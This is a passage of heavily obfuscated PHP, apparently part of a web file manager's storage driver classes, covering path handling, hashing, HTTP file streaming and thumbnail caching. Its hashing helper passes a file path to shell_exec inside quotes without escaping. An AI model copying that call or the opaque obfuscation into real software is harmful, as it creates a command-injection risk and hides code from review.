} public function uploadMultiData($³Ìßùåí, $ÁÏÁ°àÍ = 3600) { } public function multiUploadFormData($ş–œİ¸», $û†Ö›‹ = 3600) { return $this->uploadMultiData($ş–œİ¸», $û†Ö›‹); } public function download($ÒÛÌü–ê, $˜î˜ˆ¿Ä) { } public function ext($™¡›Ûš¨) { $ûöÒ¼»Ç =& $_SERVER[¿ÈˆÑ¸ä]; if (strpos($™¡›Ûš¨, $ûöÒ¼»Ç[8]) === -1) { $²ÇåÜ = $™¡›Ûš¨; } else { $²ÇåÜ = $this->pathThis($™¡›Ûš¨); } $ß¿Ú“Ğì = $ûöÒ¼»Ç[12]; if (strstr($²ÇåÜ, $ûöÒ¼»Ç[10])) { $ß¿Ú“Ğì = substr($²ÇåÜ, strrpos($²ÇåÜ, $ûöÒ¼»Ç[10]) + 1); $ß¿Ú“Ğì = strtolower($ß¿Ú“Ğì); } if (strlen($ß¿Ú“Ğì) > 3 && preg_match($ûöÒ¼»Ç[97], $ß¿Ú“Ğì, $˜„âìâ•)) { $ß¿Ú“Ğì = $ûöÒ¼»Ç[12]; } return $ß¿Ú“Ğì; } public function pathThis($Á‹ÏÔê) { $µºŠüŞÇ =& $_SERVER[¿ÈˆÑ¸ä]; $Á‹ÏÔê = str_replace($µºŠüŞÇ[98], $µºŠüŞÇ[8], rtrim($Á‹ÏÔê, $µºŠüŞÇ[8])); $¦“ô×«­ = strrpos($Á‹ÏÔê, $µºŠüŞÇ[8]); if ($¦“ô×«­ === !1) { return $Á‹ÏÔê; } return substr($Á‹ÏÔê, $¦“ô×«­ + 1); } public function pathFather($ƒ‡²ÊÜ) { $ùÖ³ß×½ =& $_SERVER[¿ÈˆÑ¸ä]; $ƒ‡²ÊÜ = str_replace($ùÖ³ß×½[98], $ùÖ³ß×½[8], rtrim($ƒ‡²ÊÜ, $ùÖ³ß×½[8])); $Ş¼Æ“‰Ò = strrpos($ƒ‡²ÊÜ, $ùÖ³ß×½[8]); if ($Ş¼Æ“‰Ò === !1) { return $ùÖ³ß×½[12]; } return substr($ƒ‡²ÊÜ, 0, $Ş¼Æ“‰Ò + 1); } public function hashSimple($ÂÔŸº¦Ï) { $˜œÍÈ¾» =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ÂÔŸº¦Ï) { return md5($˜œÍÈ¾»[12]); } $¸Ó½Æ±Á = $this->size($ÂÔŸº¦Ï); $›ô­Î€È = 200; $Á˜¿üÎ = 50; if ($¸Ó½Æ±Á <= $›ô­Î€È * $Á˜¿üÎ) { return $this->hashMd5($ÂÔŸº¦Ï) . $¸Ó½Æ±Á; } $¨É¬÷ºÅ = intval($¸Ó½Æ±Á / $Á˜¿üÎ); $¯Ù‚·§ = $˜œÍÈ¾»[12]; for ($öÜ‘±â = 0; $öÜ‘±â < $Á˜¿üÎ; $öÜ‘±â++) { $¯Ù‚·§ .= $this->fileSubstr($ÂÔŸº¦Ï, $¨É¬÷ºÅ * $öÜ‘±â, $›ô­Î€È); } $¯Ù‚·§ .= $this->fileSubstr($ÂÔŸº¦Ï, $¸Ó½Æ±Á - $›ô­Î€È, $›ô­Î€È); return md5($¯Ù‚·§) . $¸Ó½Æ±Á; } public static $md5Cache = array(); public function hashMd5($Èˆœù¢Ü) { if (!$Èˆœù¢Ü) { return md5($_SERVER[¿ÈˆÑ¸ä][12]); } $Èˆœù¢Ü = $this->iconvSystem($Èˆœù¢Ü); if (isset(self::$md5Cache[$Èˆœù¢Ü])) { return self::$md5Cache[$Èˆœù¢Ü]; } self::$md5Cache[$Èˆœù¢Ü] = $this->hashMd5Shell($Èˆœù¢Ü); if (!self::$md5Cache[$Èˆœù¢Ü]) { self::$md5Cache[$Èˆœù¢Ü] = @md5_file($Èˆœù¢Ü); } return self::$md5Cache[$Èˆœù¢Ü]; } private function hashMd5Shell($›Ş–à›) { $üºÏ†–¼ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$›Ş–à›) { return md5($üºÏ†–¼[12]); } if (!function_exists($üºÏ†–¼[99])) { return !1; } $ëØÆÁÎ¸ = array($üºÏ†–¼[100], $üºÏ†–¼[101]); $°Ò¡£Ó = Cache::get($üºÏ†–¼[102]); if (!$°Ò¡£Ó) { $ÕŸÕÃÑÒ = BASIC_PATH . $üºÏ†–¼[103]; $ÅÊš¡óÕ = md5_file($ÕŸÕÃÑÒ); $°Ò¡£Ó = $üºÏ†–¼[104]; foreach ($ëØÆÁÎ¸ as $¤Ô§°¬Š) { $ëÎ°ôÏ = shell_exec($¤Ô§°¬Š . "\x20\x22{$ÕŸÕÃÑÒ}\x22"); if ($ëÎ°ôÏ && substr(trim($ëÎ°ôÏ), 0, 32) == $ÅÊš¡óÕ) { $°Ò¡£Ó = $¤Ô§°¬Š; break; } } Cache::set($üºÏ†–¼[102], $°Ò¡£Ó, 3600); } if ($°Ò¡£Ó == $üºÏ†–¼[104]) { return !1; } $ëÎ°ôÏ = shell_exec($°Ò¡£Ó . "\40\x22{$›Ş–à›}\x22"); $ëÎ°ôÏ = str_replace($üºÏ†–¼[105], $üºÏ†–¼[12], $ëÎ°ôÏ); return substr($ëÎ°ôÏ, 0, 32); } public function link($‰€¯ñï) { return $‰€¯ñï; } public function fileOut($ÜË–œÆÕ, $‡£¯ÖßÜ = false, $ÆƒŠù»× = false, $Ä¹´ƒÔù = '') { $äıæÓ’³ =& $_SERVER[¿ÈˆÑ¸ä]; $this->cacheMethod(null, null); if (!$ÜË–œÆÕ || !$this->exist($ÜË–œÆÕ)) { show_json(LNG($äıæÓ’³[106]), !1, $ÆƒŠù»×); } $Â÷¸™˜¬ = $this->getType() == $äıæÓ’³[107]; $¦ÖËùŞ‰ = $GLOBALS[$äıæÓ’³[6]][$äıæÓ’³[92]][$äıæÓ’³[108]][$äıæÓ’³[109]]; $±ÏšËÑ± = (double) $GLOBALS[$äıæÓ’³[6]][$äıæÓ’³[92]][$äıæÓ’³[108]][$äıæÓ’³[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÇÚ÷ˆÕì = $this->infoFull($ÜË–œÆÕ); $¤ÛÚ¸í§ = $ÇÚ÷ˆÕì[$äıæÓ’³[79]]; $ş›ÛîÀ = gmdate($äıæÓ’³[111], $ÇÚ÷ˆÕì[$äıæÓ’³[88]]); $•˜¢Õïş = $ÆƒŠù»× ? $ÆƒŠù»× : $this->iconvApp($ÇÚ÷ˆÕì[$äıæÓ’³[32]]); $…•ãÖéÑ = 0; $ç…‰²Êö = $¤ÛÚ¸í§ - 1; $²¿ÉÄé§ = $this->ext($•˜¢Õïş); if (in_array($²¿ÉÄé§, array($äıæÓ’³[112], $äıæÓ’³[113], $äıæÓ’³[114], $äıæÓ’³[115]))) { $²¿ÉÄé§ = $äıæÓ’³[116]; } if (in_array($²¿ÉÄé§, array($äıæÓ’³[117]))) { $²¿ÉÄé§ = $äıæÓ’³[118]; } if (!$Ä¹´ƒÔù) { $Ä¹´ƒÔù = md5($ş›ÛîÀ . $¤ÛÚ¸í§); } $Ä¹´ƒÔù = $äıæÓ’³[119] . $Ä¹´ƒÔù . $äıæÓ’³[119]; $´ùù‘õå = get_file_mime($²¿ÉÄé§); $¸»›¿ş = !0; $¸»›¿ş = isset($_GET[$äıæÓ’³[120]]) ? !1 : !0; if ($‡£¯ÖßÜ === !1 && !mime_support($´ùù‘õå)) { $´ùù‘õå = $äıæÓ’³[121]; } header($äıæÓ’³[122]); header($äıæÓ’³[123] . $´ùù‘õå); $€à‰´ç§ = rawurlencode($•˜¢Õïş); $€à‰´ç§ = $äıæÓ’³[119] . $€à‰´ç§ . $äıæÓ’³[124] . $€à‰´ç§; if ($‡£¯ÖßÜ) { header($äıæÓ’³[125]); header($äıæÓ’³[126] . $€à‰´ç§); } else { if ($¸»›¿ş) { header($äıæÓ’³[127] . $€à‰´ç§); } } $Ø‹Óø¢× = 3600 * 24 * 30; header($äıæÓ’³[128]); header($äıæÓ’³[129]); header($äıæÓ’³[130] . $Ø‹Óø¢×); header($äıæÓ’³[131] . gmdate($äıæÓ’³[111], time() + $Ø‹Óø¢×) . $äıæÓ’³[132]); if (isset($_SERVER[$äıæÓ’³[133]]) && strtotime($_SERVER[$äıæÓ’³[133]]) == $ÇÚ÷ˆÕì[$äıæÓ’³[88]]) { header($äıæÓ’³[134], !0, 304); die; } if (isset($_SERVER[$äıæÓ’³[135]]) && $_SERVER[$äıæÓ’³[135]] == $Ä¹´ƒÔù) { header($äıæÓ’³[136] . $Ä¹´ƒÔù, !0, 304); die; } header($äıæÓ’³[136] . $Ä¹´ƒÔù); header($äıæÓ’³[137] . $ş›ÛîÀ . $äıæÓ’³[132]); header($äıæÓ’³[138] . rawurlencode($•˜¢Õïş)); header($äıæÓ’³[139]); header($äıæÓ’³[140] . $¤ÛÚ¸í§); header($äıæÓ’³[141]); Hook::trigger($äıæÓ’³[142], $ÜË–œÆÕ, $¤ÛÚ¸í§, $•˜¢Õïş, $²¿ÉÄé§); if (!$‡£¯ÖßÜ && $²¿ÉÄé§ == $äıæÓ’³[143]) { if ($¤ÛÚ¸í§ > 1024 * 1024 * 10) { die; } $è­Ş†çŞ = $this->getContent($ÜË–œÆÕ); $è­Ş†çŞ = Html::clearSVG($è­Ş†çŞ); header($äıæÓ’³[144] . strlen($è­Ş†çŞ)); echo $è­Ş†çŞ; die; } $ƒ²÷º·í = strtolower($_SERVER[$äıæÓ’³[145]]); if ($Â÷¸™˜¬ && $ƒ²÷º·í && $¦ÖËùŞ‰) { if (strstr($ƒ²÷º·í, $äıæÓ’³[146])) { header($äıæÓ’³[147] . $ÜË–œÆÕ); } else { if (strstr($ƒ²÷º·í, $äıæÓ’³[148])) { header($äıæÓ’³[149] . $ÜË–œÆÕ); } else { if (strstr($ƒ²÷º·í, $äıæÓ’³[150])) { header($äıæÓ’³[151] . $ÜË–œÆÕ); } } } if ($±ÏšËÑ±) { header($äıæÓ’³[152] . $±ÏšËÑ±); } return; } if (isset($_SERVER[$äıæÓ’³[153]])) { if (preg_match($äıæÓ’³[154], $_SERVER[$äıæÓ’³[153]], $ğŸ±±¦ş)) { $…•ãÖéÑ = intval($ğŸ±±¦ş[1]); $…•ãÖéÑ = $…•ãÖéÑ <= 0 ? 0 : ($…•ãÖéÑ >= $ç…‰²Êö ? $ç…‰²Êö : $…•ãÖéÑ); if (!empty($ğŸ±±¦ş[2])) { $£¸¦ÖÎ« = intval($ğŸ±±¦ş[2]); $ç…‰²Êö = $£¸¦ÖÎ« < $…•ãÖéÑ ? $…•ãÖéÑ : ($£¸¦ÖÎ« >= $ç…‰²Êö ? $ç…‰²Êö : $£¸¦ÖÎ«); } } header($äıæÓ’³[155]); header("\x43\157\156\164\145\x6e\164\x2d\x52\x61\156\147\145\x3a\40\142\171\164\x65\163\40{$…•ãÖéÑ}\55{$ç…‰²Êö}\57" . $¤ÛÚ¸í§); } else { header($äıæÓ’³[156]); } header($äıæÓ’³[157]); header($äıæÓ’³[158]); $´ìŒšñú = !0; if ($_SERVER[$äıæÓ’³[159]] == $äıæÓ’³[160] && $¤ÛÚ¸í§ > 1204 * 1024 * 1024 * 2) { $´ìŒšñú = !1; } if ($´ìŒšñú) { header($äıæÓ’³[161] . ($ç…‰²Êö - $…•ãÖéÑ + 1)); } if ($_SERVER[$äıæÓ’³[162]] == $äıæÓ’³[163]) { return; } $¡†ï”½Ù = array($äıæÓ’³[164] => !1, $äıæÓ’³[165] => $…•ãÖéÑ, $äıæÓ’³[166] => $ç…‰²Êö, $äıæÓ’³[167] => $²¿ÉÄé§, $äıæÓ’³[168] => $ÇÚ÷ˆÕì, $äıæÓ’³[169] => $äıæÓ’³[12], $äıæÓ’³[170] => 0); $¡†ï”½Ù = Hook::filter($äıæÓ’³[171], $¡†ï”½Ù); $ ÆõÇıŒ = 1024 * 300; $úé”Å•  = 0; if ($±ÏšËÑ±) { $úé”Å•  = intval(1000 * 1000 * ($ ÆõÇıŒ / $±ÏšËÑ±)); } while ($…•ãÖéÑ <= $ç…‰²Êö) { $å³ŠÆÅñ = timeFloat(); check_abort(); $¾–Ù«©ß = $ç…‰²Êö - $…•ãÖéÑ + 1; if ($¾–Ù«©ß <= $ ÆõÇıŒ) { $ ÆõÇıŒ = $¾–Ù«©ß; } $è­Ş†çŞ = $this->fileSubstr($ÜË–œÆÕ, $…•ãÖéÑ, $ ÆõÇıŒ); if ($¡†ï”½Ù[$äıæÓ’³[164]]) { $¡†ï”½Ù[$äıæÓ’³[169]] = $è­Ş†çŞ; $¡†ï”½Ù[$äıæÓ’³[170]] = $…•ãÖéÑ; $¡†ï”½Ù = Hook::filter($äıæÓ’³[172], $¡†ï”½Ù); $è­Ş†çŞ = $¡†ï”½Ù[$äıæÓ’³[169]]; } echo $è­Ş†çŞ; $…•ãÖéÑ += $ ÆõÇıŒ; if ($ ÆõÇıŒ == $¾–Ù«©ß) { $…•ãÖéÑ = $ç…‰²Êö + 1; } if ($úé”Å• ) { $¡£ëÏ¼‘ = intval(1000 * 1000 * (timeFloat() - $å³ŠÆÅñ)); $ÉêŒÅ…é = $úé”Å•  - $¡£ëÏ¼‘; if ($ÉêŒÅ…é > 5) { usleep($ÉêŒÅ…é); } } } } public function fileOutServer($å×šï¼¿, $·Ì¹áÙ® = false, $›™÷ñİã = false, $«Ëü‹•· = '') { $this->fileOut($å×šï¼¿, $·Ì¹áÙ®, $›™÷ñİã, $«Ëü‹•·); } public function fileOutLink($¥¦³ı£) { header($_SERVER[¿ÈˆÑ¸ä][173] . $¥¦³ı£); die; } public function cacheMethod($§ŠÂ¸, $ŠÒ±Ë¬, $¾„ù‘÷Ö = null) { $Ôü¹äÔô =& $_SERVER[¿ÈˆÑ¸ä]; static $á‡‘™Ü = array(); $Ã±ààÇ² = $ŠÒ±Ë¬ ? ltrim($this->getPathOuter($ŠÒ±Ë¬), $Ôü¹äÔô[8]) : $Ôü¹äÔô[12]; $à£›åòŒ = $Ôü¹äÔô[174] . $§ŠÂ¸ . $Ôü¹äÔô[175] . rtrim($Ã±ààÇ², $Ôü¹äÔô[8]); if (is_null($§ŠÂ¸)) { $á‡‘™Ü = array(); return; } if (is_null($ŠÒ±Ë¬)) { foreach ($á‡‘™Ü as $à£›åòŒ => $Ä°ƒŸùë) { if (!strstr($à£›åòŒ, $Ôü¹äÔô[174] . $§ŠÂ¸ . $Ôü¹äÔô[176])) { continue; } unset($á‡‘™Ü[$à£›åòŒ]); } return; } if ($¾„ù‘÷Ö === $Ôü¹äÔô[177]) { unset($á‡‘™Ü[$à£›åòŒ]); return; } if (!is_null($¾„ù‘÷Ö)) { $á‡‘™Ü[$à£›åòŒ] = $¾„ù‘÷Ö; return; } $¬ò¼çÙ¡ = isset($á‡‘™Ü[$à£›åòŒ]) ? $á‡‘™Ü[$à£›åòŒ] : null; if (!is_null($¬ò¼çÙ¡)) { return $¬ò¼çÙ¡; } $¬ò¼çÙ¡ = $this->{$§ŠÂ¸}($ŠÒ±Ë¬); $á‡‘™Ü[$à£›åòŒ] = $¬ò¼çÙ¡; return $¬ò¼çÙ¡; } public function cacheMethodInfoSet($®¹ÖÍ¸Ç, $İ­ø¦ŸÍ, $Á¬ï™Á¶ = false) { $­¢Å•÷ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($­¢Å•÷[178], $®¹ÖÍ¸Ç, $İ­ø¦ŸÍ); $this->cacheMethod($­¢Å•÷[179], $®¹ÖÍ¸Ç, $İ­ø¦ŸÍ ? !1 : !0); if (is_array($Á¬ï™Á¶)) { $this->cacheMethod($­¢Å•÷[180], $®¹ÖÍ¸Ç, $Á¬ï™Á¶); } } public function fileOutImage($ŞÄÈúûÚ, $Ô­ª¯ïô = 250) { $ŒÖèÕÅ° =& $_SERVER[¿ÈˆÑ¸ä]; set_timeout(); if (substr($ŞÄÈúûÚ, 0, 4) == $ŒÖèÕÅ°[150]) { $this->fileOutLink($ŞÄÈúûÚ); } $Âå·î› = $this->info($ŞÄÈúûÚ); $ÈÜÊÓ’® = !1; $î¶ØÃş = isset($GLOBALS[$ŒÖèÕÅ°[181]]) ? $GLOBALS[$ŒÖèÕÅ°[181]] : array(); if ($î¶ØÃş && $î¶ØÃş[$ŒÖèÕÅ°[182]] == $Âå·î›[$ŒÖèÕÅ°[87]]) { $Âå·î› = $î¶ØÃş; $ŠÍäÒ˜‘ = $Âå·î›[$ŒÖèÕÅ°[183]]; if ($ŠÍäÒ˜‘ && isset($ŠÍäÒ˜‘[$ŒÖèÕÅ°[184]])) { if ($ŠÍäÒ˜‘[$ŒÖèÕÅ°[184]] <= $Ô­ª¯ïô && $ŠÍäÒ˜‘[$ŒÖèÕÅ°[185]] <= $Ô­ª¯ïô) { $ÈÜÊÓ’® = !0; } } } if ($Âå·î›[$ŒÖèÕÅ°[79]] <= 1024 * 50 || $ÈÜÊÓ’® || !function_exists($ŒÖèÕÅ°[186]) || $Âå·î›[$ŒÖèÕÅ°[167]] == $ŒÖèÕÅ°[187]) { return $this->fileOut($ŞÄÈúûÚ, !1, $Âå·î›[$ŒÖèÕÅ°[32]]); } $åùì¯³£ = kodIO::hashPath($Âå·î›); $ĞíÃÏµ = "\x63\157\166\145\162\x5f{$åùì¯³£}\137{$Ô­ª¯ïô}\56\160\156\x67"; $Ü¿Ëğ½ä = IO_PATH_SYSTEM_TEMP . $ŒÖèÕÅ°[188]; $ğÒ«ø = IO::infoFullSimple($Ü¿Ëğ½ä); $ŞÉÖÆêÀ = $ğÒ«ø && is_array($ğÒ«ø) ? $ğÒ«ø[$ŒÖèÕÅ°[87]] : $ŒÖèÕÅ°[12]; if (!$ŞÉÖÆêÀ) { $ŞÉÖÆêÀ = IO::mkdir($Ü¿Ëğ½ä); } if ($Âå·î›[$ŒÖèÕÅ°[189]] == $ŒÖèÕÅ°[190] && isset($Âå·î›[$ŒÖèÕÅ°[191]]) && $Âå·î›[$ŒÖèÕÅ°[191]] == kodIO::sourceID($ŞÉÖÆêÀ)) { $ÏõÔ´·… = $Âå·î›[$ŒÖèÕÅ°[192]]; if ($Ô­ª¯ïô <= 500) { $øËŞ¼µ = preg_replace($ŒÖèÕÅ°[193], $ŒÖèÕÅ°[194], $Âå·î›[$ŒÖèÕÅ°[32]]); $ÏõÔ´·… = IO::fileNameExist($ŞÉÖÆêÀ, $øËŞ¼µ); } return IO::fileOut(KodIO::make($ÏõÔ´·…), !1, $Âå·î›[$ŒÖèÕÅ°[32]]); } $ÍŠ”ÆÔ® = IO::fileNameExist($ŞÉÖÆêÀ, $ĞíÃÏµ); if ($ÍŠ”ÆÔ®) { return IO::fileOut(KodIO::make($ÍŠ”ÆÔ®), !1, $Âå·î›[$ŒÖèÕÅ°[32]]); } if ($Ô­ª¯ïô > 1000) { $this->makeImageCover($ŞÉÖÆêÀ, $ŞÄÈúûÚ, $ĞíÃÏµ, $Ô­ª¯ïô); $this->makeImageCover($ŞÉÖÆêÀ, $ŞÄÈúûÚ, "\x63\157\x76\x65\x72\x5f{$åùì¯³£}\x5f\x32\65\60\x2e\x70\156\x67", 250); $ÍŠ”ÆÔ® = IO::fileNameExist($ŞÉÖÆêÀ, $ĞíÃÏµ); if ($ÍŠ”ÆÔ®) { return IO::fileOut(KodIO::make($ÍŠ”ÆÔ®), !1, $Âå·î›[$ŒÖèÕÅ°[32]]); } die; } if (!kodIO::allowCover($Âå·î›)) { return $this->fileOut($ŞÄÈúûÚ, !1, $Âå·î›[$ŒÖèÕÅ°[32]]); } $Éõ‡°¿ = Cache::get($ĞíÃÏµ); if ($Éõ‡°¿ == $ŒÖèÕÅ°[195] || $Éõ‡°¿ == $ŒÖèÕÅ°[196]) { echo $Éõ‡°¿; die; } Cache::set($ĞíÃÏµ, $ŒÖèÕÅ°[196], 60); $èŒ…æıÕ = array($ŞÉÖÆêÀ, $Âå·î›[$ŒÖèÕÅ°[87]], $ĞíÃÏµ, $Ô­ª¯ïô); $¤ÈüæŞ­ = $ŒÖèÕÅ°[197] . $Âå·î›[$ŒÖèÕÅ°[79]] . $ŒÖèÕÅ°[198] . $ĞíÃÏµ . $ŒÖèÕÅ°[199] . $Âå·î›[$ŒÖèÕÅ°[32]] . $ŒÖèÕÅ°[200] . $Âå·î›[$ŒÖèÕÅ°[87]]; TaskQueue::add($ŒÖèÕÅ°[201], $èŒ…æıÕ, $¤ÈüæŞ­, $ĞíÃÏµ); } public function makeImageCover($ã‡×‹í£, $­Éã×¦†, $îµ¢Ë°Ä, $ÌÕøë®Æ) { $‰Ú…ìƒ =& $_SERVER[¿ÈˆÑ¸ä]; if (IO::fileNameExist($ã‡×‹í£, $îµ¢Ë°Ä)) { return $‰Ú…ìƒ[202]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $èµÊõ…¦ = $this->getPathOuter($­Éã×¦†); $éÜ­ÈûÚ = DATA_THUMB . $îµ¢Ë°Ä; del_file($éÜ­ÈûÚ); $æ¬—­¿ = IO::copy($èµÊõ…¦, TEMP_FILES, !1, $îµ¢Ë°Ä); if (!@file_exists($æ¬—­¿)) { return $‰Ú…ìƒ[203]; } ImageThumb::createThumb($æ¬—­¿, $éÜ­ÈûÚ, $ÌÕøë®Æ, $ÌÕøë®Æ * 10); if (@file_exists($éÜ­ÈûÚ)) { Cache::remove($îµ¢Ë°Ä); return IO::move($éÜ­ÈûÚ, $ã‡×‹í£); } Cache::set($îµ¢Ë°Ä, $‰Ú…ìƒ[195], 600); del_file($éÜ­ÈûÚ); return $‰Ú…ìƒ[204] . $æ¬—­¿ . $‰Ú…ìƒ[74]; } public function fileOutImageServer($ºç¡ö‘…, $ÕŞÜá›¼ = 250) { $this->fileOutImage($ºç¡ö‘…, $ÕŞÜá›¼); } public function fileNameAuto($…°ŸÀ¼«, $…½Æ¶„å, $Ùáäõ‡ = REPEAT_RENAME, $ó·õŸ¤Ø = false) { $šÆàÕ³Ô =& $_SERVER[¿ÈˆÑ¸ä]; $Şäí¥ = $…°ŸÀ¼« === $šÆàÕ³Ô[12] ? $…½Æ¶„å : rtrim($…°ŸÀ¼«, $šÆàÕ³Ô[8]) . $šÆàÕ³Ô[8] . $…½Æ¶„å; if ($Ùáäõ‡ == REPEAT_REPLACE || !$this->exist($Şäí¥) || $ó·õŸ¤Ø && $Ùáäõ‡ != REPEAT_RENAME_FOLDER) { return $…½Æ¶„å; } if ($Ùáäõ‡ == REPEAT_SKIP) { return !1; } $şÜ‡‡¾˜ = $šÆàÕ³Ô[10] . get_path_ext($…½Æ¶„å); $şÜ‡‡¾˜ = $şÜ‡‡¾˜ == $šÆàÕ³Ô[10] || $ó·õŸ¤Ø ? $šÆàÕ³Ô[12] : $şÜ‡‡¾˜; $œš©¤¬™ = 1; $êöâÎÏÌ = substr($…½Æ¶„å, 0, strlen($…½Æ¶„å) - strlen($şÜ‡‡¾˜)); $üĞ‚ïé® = $êöâÎÏÌ . "\50{$œš©¤¬™}\51{$şÜ‡‡¾˜}"; while ($this->exist(rtrim($…°ŸÀ¼«, $šÆàÕ³Ô[8]) . $šÆàÕ³Ô[8] . $üĞ‚ïé®)) { $üĞ‚ïé® = $êöâÎÏÌ . "\x28{$œš©¤¬™}\51{$şÜ‡‡¾˜}"; $œš©¤¬™++; } return $üĞ‚ïé®; } private function fileNameAutoList($¸Ììµ¨Ì, $¼ÓªŞæÕ, $²…ƒ°µ = false) { $ŠûÚ¡’† =& $_SERVER[¿ÈˆÑ¸ä]; $û©¾ïÆõ = $this->listPath($¸Ììµ¨Ì, !0); $û©¾ïÆõ = array_merge($û©¾ïÆõ[$ŠûÚ¡’†[85]], $û©¾ïÆõ[$ŠûÚ¡’†[86]]); $ÁÊ¦Î²¥ = array_to_keyvalue($û©¾ïÆõ, $ŠûÚ¡’†[12], $ŠûÚ¡’†[32]); $Ìô’•¯ª = $ŠûÚ¡’†[10] . get_path_ext($¼ÓªŞæÕ); $Ìô’•¯ª = $Ìô’•¯ª == $ŠûÚ¡’†[10] || $²…ƒ°µ ? $ŠûÚ¡’†[12] : $Ìô’•¯ª; $²°¶úÁ¨ = substr($¼ÓªŞæÕ, 0, strlen($¼ÓªŞæÕ) - strlen($Ìô’•¯ª)); $èë£‰¼« = $²°¶úÁ¨ . "\50\x30\x29{$Ìô’•¯ª}"; for ($Íö÷ÎÜè = 1; $Íö÷ÎÜè <= count($ÁÊ¦Î²¥) + 1; $Íö÷ÎÜè++) { $èë£‰¼« = $²°¶úÁ¨ . "\x28{$Íö÷ÎÜè}\x29{$Ìô’•¯ª}"; if (!in_array_not_case($èë£‰¼«, $ÁÊ¦Î²¥)) { return $èë£‰¼«; } } return $èë£‰¼«; } public function listAllFiles($µñŒ¦ä­, $”ëØˆ’ë) { $†ğïôİø =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($”ëØˆ’ë)) { return array(); } $íˆÈâëä = array_keys($”ëØˆ’ë); $àÆğ”äî = array(); $µñŒ¦ä­ = trim($µñŒ¦ä­, $†ğïôİø[8]); foreach ($”ëØˆ’ë as $Ù‘ÓÌÜ => $ãÑêšÍª) { $Æø˜¸İ = ltrim(substr(trim($Ù‘ÓÌÜ, $†ğïôİø[8]), strlen($µñŒ¦ä­)), $†ğïôİø[8]); if (substr($Ù‘ÓÌÜ, -1) == $†ğïôİø[8]) { $Æø˜¸İ = rtrim($Æø˜¸İ, $†ğïôİø[8]) . $†ğïôİø[8]; } $àÆğ”äî = array_merge($àÆğ”äî, $this->slicePath($Æø˜¸İ)); } $‡Á¬˜À = array(); foreach (array_unique($àÆğ”äî) as $ó—÷‹œ¸) { $òüÑËš = array($†ğïôİø[87] => $this->getPathOuter($†ğïôİø[8] . $µñŒ¦ä­ . $†ğïôİø[8] . $ó—÷‹œ¸), $†ğïôİø[78] => 1, $†ğïôİø[79] => 0); if (substr($ó—÷‹œ¸, -1) != $†ğïôİø[8]) { $òüÑËš[$†ğïôİø[78]] = 0; $¤¬ñ²çÔ = $this->getPath($µñŒ¦ä­ . $†ğïôİø[8] . $ó—÷‹œ¸); if (isset($”ëØˆ’ë[$¤¬ñ²çÔ])) { $ü¥¡š÷¡ = $”ëØˆ’ë[$¤¬ñ²çÔ]; if (isset($ü¥¡š÷¡[$†ğïôİø[79]])) { $òüÑËš[$†ğïôİø[79]] = intval($ü¥¡š÷¡[$†ğïôİø[79]]); } if (isset($ü¥¡š÷¡[$†ğïôİø[205]])) { $òüÑËš[$†ğïôİø[88]] = intval($ü¥¡š÷¡[$†ğïôİø[205]]); } } } $‡Á¬˜À[] = $òüÑËš; } return $‡Á¬˜À; } public function slicePath($¼³°ÜŒ¯) { $ıÏìõı =& $_SERVER[¿ÈˆÑ¸ä]; $´ıÓ² = explode($ıÏìõı[8], trim($¼³°ÜŒ¯, $ıÏìõı[8])); $ıÑøä”˜ = 0; do { ++$ıÑøä”˜; $ˆçà½¬ö[] = implode($ıÏìõı[8], array_slice($´ıÓ², 0, $ıÑøä”˜)) . $ıÏìõı[8]; } while ($ıÑøä”˜ < count($´ıÓ²)); $ˆçà½¬ö[count($´ıÓ²) - 1] = $¼³°ÜŒ¯; return $ˆçà½¬ö; } public function getHost() { $Ø‰¼µÖÀ =& $_SERVER[¿ÈˆÑ¸ä]; $©ŒüıÊÅ = parse_url(trim($this->domain, $Ø‰¼µÖÀ[8])); $»ÜÏ† = isset($©ŒüıÊÅ[$Ø‰¼µÖÀ[206]]) ? $©ŒüıÊÅ[$Ø‰¼µÖÀ[206]] : http_type(); $‹ÒıƒÈ› = isset($©ŒüıÊÅ[$Ø‰¼µÖÀ[207]]) ? $©ŒüıÊÅ[$Ø‰¼µÖÀ[207]] : $©ŒüıÊÅ[$Ø‰¼µÖÀ[87]]; if (isset($©ŒüıÊÅ[$Ø‰¼µÖÀ[208]])) { $‹ÒıƒÈ› .= $Ø‰¼µÖÀ[4] . $©ŒüıÊÅ[$Ø‰¼µÖÀ[208]]; } return $»ÜÏ† . $Ø‰¼µÖÀ[209] . $‹ÒıƒÈ›; } public function pathEncode($×½Ü’„) { $Ã¥íğõ˜ =& $_SERVER[¿ÈˆÑ¸ä]; return str_replace($Ã¥íğõ˜[210], $Ã¥íğõ˜[8], rawurlencode($×½Ü’„)); } public function writeLog($ç¹ñ£Œè = '', $ ¸õ¬ï¸ = false) { $‘“üíº =& $_SERVER[¿ÈˆÑ¸ä]; $ˆÅÈáË = in_array(ACTION, array($‘“üíº[211], $‘“üíº[212])); if (!$ˆÅÈáË && !GLOBAL_DEBUG) { return; } $ÖÀ¿Ø±ˆ = $ç¹ñ£Œè; static $Ú°ñ§² = null; if (!$Ú°ñ§²) { $Ú°ñ§² = strtoupper($this->getType()); } $ç¹ñ£Œè = $Ú°ñ§² . $‘“üíº[213] . $ç¹ñ£Œè; if ($ ¸õ¬ï¸) { $œÚ£„€ = error_get_last(); if ($œÚ£„€) { $ç¹ñ£Œè = array($ç¹ñ£Œè, $œÚ£„€); } } write_log($ç¹ñ£Œè, $‘“üíº[214]); if ($ˆÅÈáË) { throw new Exception($ÖÀ¿Ø±ˆ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($´Ñ¤×ìô) { set_timeout(); require_once SDK_DIR . $_SERVER[¿ÈˆÑ¸ä][215]; parent::__construct(); $this->_init($´Ñ¤×ìô); } public function _init($¡—úØ•) { $’ñìŠŞ¤ =& $_SERVER[¿ÈˆÑ¸ä]; $this->config = $¡—úØ•; foreach ($¡—úØ• as $… ŞûØ => $È‘‚Ø„…) { 